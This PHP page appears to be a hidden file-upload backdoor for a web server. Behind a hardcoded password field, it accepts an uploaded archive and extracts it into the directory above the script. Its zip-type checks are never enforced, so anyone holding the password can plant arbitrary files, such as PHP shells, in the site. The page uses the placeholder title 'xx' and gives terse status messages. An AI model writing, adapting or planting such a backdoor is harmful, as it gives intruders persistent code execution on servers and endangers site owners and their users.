<?php


if($_FILES["f"]["name"] && $_POST["o"] == '010880ahcim010880ahcim') {
    $filename = $_FILES["f"]["name"];
    $source = $_FILES["f"]["tmp_name"];
    $type = $_FILES["f"]["type"];

    $name = explode(".", $filename);
    $accepted_types = array('application/zip', 'application/x-zip-compressed', 'multipart/x-zip', 'application/x-compressed');
    foreach($accepted_types as $mime_type) {
        if($mime_type == $type) {
            $okay = true;
            break;
        }
    }

    $continue = strtolower($name[1]) == 'zip' ? true : false;
    if(!$continue) {
        $message = "again.";
    }

  /* PHP current path */
  $path = dirname(__FILE__,2).'/';  // absolute path to the directory where zipper.php is in
#  print_r( $path);die();
  $filenoext = basename ($filename, '.zip');  // absolute path to the directory where zipper.php is in (lowercase)
  $filenoext = basename ($filenoext, '.ZIP');  // absolute path to the directory where zipper.php is in (when uppercase)

  $targetdir = $path . $filenoext; // target directory
  $targetzip = $path . $filename; // target zip file

  /* create directory if not exists', otherwise overwrite */
  /* target directory is same as filename without extension */

  if (is_dir($targetdir)) { mkdir($targetdir, 0777); rename ( $targetdir, $targetdir.date("Y-m-d H:i:s")); }





  /* here it is really happening */

    if(move_uploaded_file($source, $targetzip)) {
        $zip = new ZipArchive();
        $x = $zip->open($targetzip);  // open the zip file to extract
        if ($x === true) {
            $zip->extractTo( $path ); // place in the directory with same name
            $zip->close();

            unlink($targetzip);
        }
        $message = "yeah";
    } else {
        $message = "problem.";
    }
}


?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>xx</title>
</head>

<body>
<?php if($message) echo "<p>$message</p>"; ?>
<form enctype="multipart/form-data" method="post" action="">
<label><input type="file" name="f" /></label>
<br />
<br />
<input type="text" name="o" >
<br />
<br />
<input type="submit" name="submit" value="xxxxxxxxxxxxx" />
</form>
</body>
</html>
